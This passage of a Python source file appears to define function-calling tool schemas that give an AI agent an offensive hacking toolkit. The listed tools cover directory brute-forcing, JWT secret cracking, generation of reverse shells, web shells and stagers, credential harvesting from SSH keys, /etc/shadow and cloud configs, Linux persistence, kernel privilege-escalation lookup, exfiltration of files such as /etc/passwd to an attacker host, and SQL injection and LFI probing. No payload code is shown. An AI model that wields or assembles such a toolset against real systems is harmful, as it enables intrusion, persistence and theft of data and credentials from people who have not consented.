                "Fingerprint a web application: detect server, CMS/framework (WordPress, Django, "
                "Laravel, Rails…), security headers audit (HSTS, CSP, X-Frame-Options…), "
                "cookie flags, WAF detection (Cloudflare, Akamai, Imperva…), CORS policy, "
                "and form action URLs."
            ),
            "parameters": {
                "type": "object",
                "properties": {
                    "url": {"type": "string", "description": "Full URL to fingerprint (http:// or https://)"},
                },
                "required": ["url"]
            }
        }
    },
    {
        "type": "function",
        "function": {
            "name": "dir_bruteforce",
            "description": (
                "Brute-force web paths using a built-in wordlist (admin, .env, .git/HEAD, "
                "swagger.json, phpinfo.php, wp-config.php…) or a custom comma-separated list. "
                "Multi-threaded. Reports non-404 responses."
            ),
            "parameters": {
                "type": "object",
                "properties": {
                    "url":        {"type": "string",  "description": "Base URL to scan (e.g. http://target.com)"},
                    "wordlist":   {"type": "string",  "description": "Comma-separated paths to test (default: built-in ~60 paths)"},
                    "extensions": {"type": "string",  "description": "Comma-separated extensions to append e.g. 'php,html,bak'"},
                    "threads":    {"type": "integer", "description": "Concurrent threads (default 10, max 20)"},
                    "timeout":    {"type": "integer", "description": "Per-request timeout in seconds (default 6)"},
                },
                "required": ["url"]
            }
        }
    },
    {
        "type": "function",
        "function": {
            "name": "jwt_decode",
            "description": (
                "Decode a JWT token without verifying the signature. Extracts header, payload, "
                "expiry times, and flags alg=none vulnerabilities. Automatically tests 15+ weak "
                "HMAC secrets (secret, password, admin…). Optionally test a specific secret."
            ),
            "parameters": {
                "type": "object",
                "properties": {
                    "token":  {"type": "string", "description": "The JWT string (three base64url parts separated by dots)"},
                    "secret": {"type": "string", "description": "Optional specific HMAC secret to test"},
                },
                "required": ["token"]
            }
        }
    },
    {
        "type": "function",
        "function": {
            "name": "generate_payload",
            "description": (
                "Generate offensive payloads: reverse shells (bash, python, php, nc, socat, powershell, "
                "perl, ruby, golang), web shells (PHP/ASP/JSP), MSFvenom stagers, listener commands, "
                "and TTY upgrade one-liners. Use payload_type='list' to see all options."
            ),
            "parameters": {
                "type": "object",
                "properties": {
                    "payload_type": {"type": "string", "description": "Payload name e.g. 'bash', 'python3', 'php', 'nc', 'msf_elf', 'tty_python'. Use 'list' for all options."},
                    "lhost":        {"type": "string", "description": "Attacker IP/host for reverse connections"},
                    "lport":        {"type": "integer","description": "Attacker listening port"},
                },
                "required": ["payload_type"]
            }
        }
    },
    {
        "type": "function",
        "function": {
            "name": "net_recon",
            "description": (
                "Enumerate local network state: network interfaces and IPs, routing table, "
                "ARP/neighbor table, TCP/UDP listening ports with PIDs, established connections, "
                "DNS config, /etc/hosts, firewall rules (iptables/nft), open sockets."
            ),
            "parameters": {"type": "object", "properties": {}, "required": []}
        }
    },
    {
        "type": "function",
        "function": {
            "name": "cred_harvest",
            "description": (
                "Search the filesystem for credentials: shell history, SSH private keys, "
                ".env files, database connection strings, API keys/tokens, /etc/shadow, "
                "git-credentials, .netrc, cloud credentials (AWS/GCP), WordPress DB config."
            ),
            "parameters": {"type": "object", "properties": {}, "required": []}
        }
    },
    {
        "type": "function",
        "function": {
            "name": "generate_persist",
            "description": (
                "Generate Linux persistence mechanism commands. Methods: cron, cron_etc, bashrc, "
                "systemd, systemd_user, ssh_key, rc_local, motd, ld_preload, at. "
                "Use method='list' to see all with descriptions."
            ),
            "parameters": {
                "type": "object",
                "properties": {
                    "method": {"type": "string",  "description": "Persistence method e.g. 'cron', 'systemd', 'bashrc'. Use 'list' for all options."},
                    "cmd":    {"type": "string",  "description": "Command to persist (default: reverse shell to lhost:lport)"},
                    "lhost":  {"type": "string",  "description": "Attacker IP for reverse shell (used when cmd not set)"},
                    "lport":  {"type": "integer", "description": "Attacker port for reverse shell (used when cmd not set)"},
                },
                "required": ["method"]
            }
        }
    },
    {
        "type": "function",
        "function": {
            "name": "kernel_suggest",
            "description": (
                "Detect the running kernel version and suggest matching local privilege escalation "
                "exploits (Dirty Pipe, PwnKit, Baron Samedit, Dirty COW, GameOver(lay), etc.). "
                "Also checks sudo/pkexec versions. Returns CVEs, descriptions, and PoC links."
            ),
            "parameters": {"type": "object", "properties": {}, "required": []}
        }
    },
    {
        "type": "function",
        "function": {
            "name": "exfil_payload",
            "description": (
                "Generate data exfiltration commands for a given channel: "
                "http_curl, https_curl, http_wget, tar_https, nc_send/recv, "
                "dns_b64, dns_hex, scp, rsync, b64_stdout, xxd_stdout, smb, ftp, python_http, server. "
                "Use method='list' for all options."
            ),
            "parameters": {
                "type": "object",
                "properties": {
                    "method":      {"type": "string",  "description": "Exfil channel e.g. 'https_curl', 'nc_send', 'dns_b64'. Use 'list' for all."},
                    "data_source": {"type": "string",  "description": "File path to exfiltrate (default: /etc/passwd)"},
                    "lhost":       {"type": "string",  "description": "Attacker receiving host/IP"},
                    "lport":       {"type": "integer", "description": "Attacker receiving port"},
                },
                "required": ["method"]
            }
        }
    },
    {
        "type": "function",
        "function": {
            "name": "sqli_probe",
            "description": (
                "Test URL parameters for SQL injection: error-based (looks for DB error strings) "
                "and blind time-based (SLEEP/WAITFOR). Returns vulnerable parameters, payloads, "
                "and sqlmap command to continue exploitation."
            ),
            "parameters": {
                "type": "object",
                "properties": {
                    "url":    {"type": "string", "description": "Full URL including query string e.g. http://target.com/page?id=1"},
                    "params": {"type": "string", "description": "Override params as key=value&key2=val2 (default: parsed from URL)"},
                    "method": {"type": "string", "description": "HTTP method: GET (default) or POST"},
                },
                "required": ["url"]
            }
        }
    },
    {
        "type": "function",
        "function": {
            "name": "lfi_probe",
            "description": (
                "Test URL parameters for Local File Inclusion (LFI) / path traversal. "
                "Tries ../../../etc/passwd, URL-encoded variants, null-byte bypass, "
                "PHP filter wrappers (php://filter), and Windows paths. "
                "Returns vulnerable parameter, working payload, and file content preview."
            ),
            "parameters": {
                "type": "object",
                "properties": {
                    "url":   {"type": "string", "description": "Full URL with parameters e.g. http://target.com/page?file=home"},
                    "param": {"type": "string", "description": "Specific parameter to test (default: all query params)"},
                },
                "required": ["url"]
            }
        }
    },
]
